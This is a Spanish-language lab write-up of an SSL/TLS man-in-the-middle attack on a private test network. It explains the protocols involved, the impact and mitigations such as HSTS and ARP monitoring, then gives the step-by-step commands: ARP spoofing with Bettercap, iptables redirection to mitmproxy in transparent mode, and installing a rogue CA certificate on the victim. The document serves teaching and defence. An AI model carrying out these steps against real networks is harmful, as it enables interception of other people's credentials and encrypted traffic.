# SSL/TLS Man-in-the-Middle (MITM)
Nombre del ataque

SSL/TLS Man-in-the-Middle (MITM)

Descripción

Este ataque consiste en interceptar comunicaciones cifradas entre un cliente y un servidor web. El atacante se posiciona como intermediario dentro de la red local mediante técnicas de ARP Spoofing y redirección de tráfico, utilizando un proxy transparente para descifrar y analizar el contenido.


Protocolos afectados

ARP (Address Resolution Protocol)
Se manipula para redirigir el tráfico de la víctima hacia el atacante.

IP / TCP
Se alteran las rutas de comunicación mediante reglas de iptables.

SSL/TLS (HTTPS)
Se rompe la confianza del canal cifrado instalando un certificado falso en la víctima, permitiendo el descifrado del tráfico.


Impacto

Captura de credenciales en texto plano.

Pérdida de confidencialidad de las comunicaciones seguras.

Posibilidad de manipulación del contenido transmitido entre cliente y servidor.


Condiciones necesarias

Acceso a la misma red local que la víctima.

Instalación de un certificado falso en el sistema víctima para evitar alertas de seguridad.


Mitigación

Uso de HSTS para forzar conexiones HTTPS legítimas.

Monitorización de ARP para detectar envenenamiento.

Uso de certificados válidos y verificación estricta en navegadores.

Segmentación de red y detección de proxies no autorizados.


Relación protocolo–ataque

| Protocolo        | Vulneración técnica                                                             | Rol en el ataque                                                                 |
|------------------|----------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
| ARP              | ARP Spoofing para engañar a la víctima y al router                              | Permite posicionar al atacante como intermediario en la red local (MITM físico) |
| HTTPS (SSL/TLS)  | Intercepción mediante proxy transparente y certificado falso                    | Permite descifrar comunicaciones seguras (credenciales, sesiones)               |
| IP / TCP         | Redirección de tráfico con reglas iptables                                      | Facilita la interceptación del tráfico antes de llegar al destino               |


Explicación paso a paso

ARP Spoofing
Bettercap envía respuestas ARP falsas para que la víctima crea que Kali es el router y viceversa. Esto explota la falta de autenticación del protocolo ARP.

Redirección de tráfico
Kali utiliza iptables para redirigir todo el tráfico HTTP (puerto 80) y HTTPS (puerto 443) al puerto 8080, donde mitmproxy lo intercepta.

Intercepción SSL/TLS
Al instalar el certificado falso en la víctima, el navegador confía en Kali como si fuera una autoridad certificadora legítima, permitiendo descifrar el tráfico HTTPS.


Topología y direcciones IP

Kali (Atacante): 192.168.0.25
Dispositivo que intercepta y analiza el tráfico.

Ubuntu (Víctima): 192.168.0.26
Equipo objetivo del cual se capturan las credenciales.

Router / Gateway: 192.168.0.1
Puerta de enlace hacia Internet.

Interfaz Kali: eth0
Interfaz de red utilizada para el ataque.


FASE 0: Preparación y limpieza del entorno

A. Limpieza de red (Kali – T1)

Restaurar IPTables -> sudo iptables -t nat -F
Elimina reglas previas de redirección para evitar conflictos.

Deshabilitar IP Forwarding -> echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
Garantiza un estado inicial neutro del sistema.


B. Actualización e instalación (Kali – T1)

Actualizar el sistema -> sudo apt update && sudo apt upgrade -y

Instalar herramientas necesarias-> sudo apt install bettercap mitmproxy -y


FASE 1: Configuración inicial del ataque (Kali – T1)
A. Preparación del certificado falso (CA)

1-Generar el certificado raíz de mitmproxy

mitmproxy

(Salir con q y confirmar con y. Se crea ~/.mitmproxy/)

2-Copiar el certificado para fácil acceso

cp ~/.mitmproxy/mitmproxy-ca-cert.pem ~/mitmproxy-ca.pem


B. Configuración del núcleo de red

Habilitar IP Forwarding -> echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

Redirección de tráfico HTTP-> sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

Redirección de tráfico HTTPS-> sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080


FASE 2: Configuración de la víctima (Linux)

A. Transferencia del certificado-> scp ~/mitmproxy-ca.pem usuario@192.168.0.X:/home/usuario/

B. Instalación del certificado de confianza

Copiar certificado al almacén del sistema-> sudo cp mitmproxy-ca.pem /usr/local/share/ca-certificates/mitmproxy-ca.crt

Actualizar certificados de confianza-> sudo update-ca-certificates

Configuración del navegador (Firefox)
Importar el certificado desde:
Preferencias → Seguridad → Certificados


FASE 3: Ejecución del ataque MITM (Kali)

A. Iniciar el proxy-> sudo mitmproxy --mode transparent
B. Iniciar el ARP Spoofing 

Lanzar Bettercap-> sudo bettercap -iface eth0

Definir objetivos-> set arp.targets 192.168.0.26,192.168.0.1

Activar ARP Spoofing-> arp.spoof on













